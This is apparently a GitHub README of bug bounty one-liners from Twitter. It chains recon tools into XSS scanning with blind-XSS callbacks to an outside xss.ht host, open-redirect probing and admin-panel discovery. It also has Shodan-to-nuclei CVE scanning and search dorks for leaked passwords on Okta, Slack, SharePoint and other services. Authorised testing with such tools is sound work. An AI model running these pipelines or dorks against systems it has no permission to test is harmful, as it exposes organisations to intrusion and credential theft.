# BugBountyTIps
Everything about bug bounty tips on twitter

<h2>XSS ONE LINER</h2>

```
cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv "\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro  | dalfox pipe -b your.xss.ht -o xss.txt
```
## XSS ONE LINER WITH KXSS

```
assetfinder -subs-only domain.com | waybackurls | grep "=" | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe -b https://syarifsajjad.xss.ht/
```

## OPEN REDIRECT ONE LINER

```
subfinder -all -d target.com -silent | waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```

## ADMIN PANEL

```
cat hosts.txt | httpx -ports 80,443,8080,8443,8090 -path /web-console/ -status-code -title -nc -t 250 -mc 200 
```

## RANDOM BUG BOUNTY HUNTING (Special tweet from Orwa Atyat) :)

```
*OKTA*
okta.com password NOT help.okta NOT developer.okta NOT support.okta NOT www.okta
*ServiceNOW*
service-now password
*Jfrog*
jfrog.io password
*onelogin*
onelogin.com password
*Atlassian*
atlassian.net password NOT domain.atlassian NOT user.atlassian NOT help.atlassian NOT
*Snow..*
snowflakecomputing.com password
*Slack*
slack.com  password
*Zendesk*
zendesk.com password NOT www.zendesk
*SharePoint*
sharepoint.com password
*Auth0*
auth0.com password NOT docs.auth0
```

## XSS PARAMSPIDER + GF XSS + DALFOX

```
python paramspider --domain target.com -o output
cat output | gf xss > gf_xss.txt
cat gf_xss.txt | dalfox -b yoursite.xss.ht
```
## SHODAN + NUCLEI = JUICY CVE

```
echo 'ssl:"dell.com" 200' | uncover -e shodan | httpx -silent | nuclei --severity medium,high,critical
```
## GIT DORKS

```
https://github.com/search?o=desc&q=att.com&s=indexed&type=Code
```
